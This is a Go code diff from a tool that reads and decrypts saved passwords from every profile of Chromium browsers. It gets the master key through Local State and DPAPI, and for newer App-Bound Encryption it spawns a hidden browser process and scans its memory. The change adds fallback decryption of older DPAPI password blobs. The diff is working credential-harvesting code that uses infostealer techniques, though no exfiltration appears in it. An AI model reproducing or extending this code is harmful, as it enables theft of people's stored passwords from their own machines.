@@ -119,7 +119,8 @@ func decryptPassword(key, ciphertext []byte) (string, error) {
 // scanChromiumPasswords reads saved passwords for one browser profile.
 // cachedKey is shared across all profiles of the same browser so we only
 // spawn the hidden browser process once per installation.
-func scanChromiumPasswords(b chromiumBrowser, profile string, cachedKey *[]byte) ([]PasswordEntry, error) {
+// errs receives diagnostic messages (key extraction failures, etc.).
+func scanChromiumPasswords(b chromiumBrowser, profile string, cachedKey *[]byte, errs *[]string) ([]PasswordEntry, error) {
 	dbPath := filepath.Join(b.userDataDir, profile, "Login Data")
 	if _, err := os.Stat(dbPath); err != nil {
 		return nil, nil
@@ -139,9 +140,10 @@ func scanChromiumPasswords(b chromiumBrowser, profile string, cachedKey *[]byte)
 		return nil, fmt.Errorf("read logins: %w", err)
 	}
 
-	// Fetch the master key once per browser (shared via cachedKey pointer).
-	// v10: try Local State DPAPI first (reliable, user-level, no admin).
-	// v20: App-Bound Encryption — use spawn-hidden + heap scan.
+	// Fetch the AES master key once per browser (shared via cachedKey pointer).
+	// v10: Local State + DPAPI (user-level, no admin, works offline).
+	// v20: App-Bound Encryption — spawn hidden browser + heap scan.
+	// Legacy (no prefix): per-blob DPAPI — handled at decryption time below.
 	if *cachedKey == nil {
 		for _, row := range rows {
 			if len(row) < 6 {
@@ -153,21 +155,29 @@ func scanChromiumPasswords(b chromiumBrowser, profile string, cachedKey *[]byte)
 			}
 			prefix := string(blob[:3])
 			if prefix == "v10" {
-				if k, err := getKeyFromLocalState(b.userDataDir); err == nil && tryDecryptKey(k, blob) {
-					*cachedKey = k
+				lsKey, lsErr := getKeyFromLocalState(b.userDataDir)
+				if lsErr == nil && tryDecryptKey(lsKey, blob) {
+					*cachedKey = lsKey
 					break
 				}
-				// Local State failed or key mismatch — fall through to spawn+scan
-				if k, err := getKeyFromBrowserMemory(b.name, blob); err == nil {
-					*cachedKey = k
+				memKey, memErr := getKeyFromBrowserMemory(b.name, blob)
+				if memErr == nil {
+					*cachedKey = memKey
+				} else {
+					*errs = append(*errs, fmt.Sprintf("%s/%s key: localstate(%v) spawn(%v)", b.name, profile, lsErr, memErr))
 				}
 				break
 			} else if prefix == "v20" {
-				if k, err := getKeyFromBrowserMemory(b.name, blob); err == nil {
-					*cachedKey = k
+				memKey, memErr := getKeyFromBrowserMemory(b.name, blob)
+				if memErr == nil {
+					*cachedKey = memKey
+				} else {
+					*errs = append(*errs, fmt.Sprintf("%s/%s v20 key spawn failed: %v", b.name, profile, memErr))
 				}
 				break
 			}
+			// No v10/v20 prefix found — legacy DPAPI per-blob, handled below.
+			break
 		}
 	}
 
@@ -187,9 +197,19 @@ func scanChromiumPasswords(b chromiumBrowser, profile string, cachedKey *[]byte)
 		if originURL == "" {
 			continue
 		}
-		password, err := decryptPassword(*cachedKey, pwdBlob)
-		if err != nil {
-			password = "[decrypt failed]"
+		password, decErr := decryptPassword(*cachedKey, pwdBlob)
+		if decErr != nil {
+			// Legacy format (pre-Chrome 80): blob is raw DPAPI output, no v10/v20 prefix.
+			// CryptUnprotectData yields the plaintext password directly.
+			if len(pwdBlob) > 0 {
+				if plain, dErr := dpapi(pwdBlob); dErr == nil {
+					password = string(plain)
+				} else {
+					password = "[decrypt failed]"
+				}
+			} else {
+				password = "[decrypt failed]"
+			}
 		}
 		entries = append(entries, PasswordEntry{
 			URL:      originURL,
@@ -217,7 +237,7 @@ func scanAllPasswords(env envPaths) ([]PasswordEntry, []string) {
 		// spawn the hidden instance once per browser installation.
 		var cachedKey []byte
 		for _, profile := range profilesInUserData(b.userDataDir) {
-			entries, err := scanChromiumPasswords(b, profile, &cachedKey)
+			entries, err := scanChromiumPasswords(b, profile, &cachedKey, &errors)
 			if err != nil {
 				errors = append(errors, fmt.Sprintf("%s/%s passwords: %v", b.name, profile, err))
 				continue
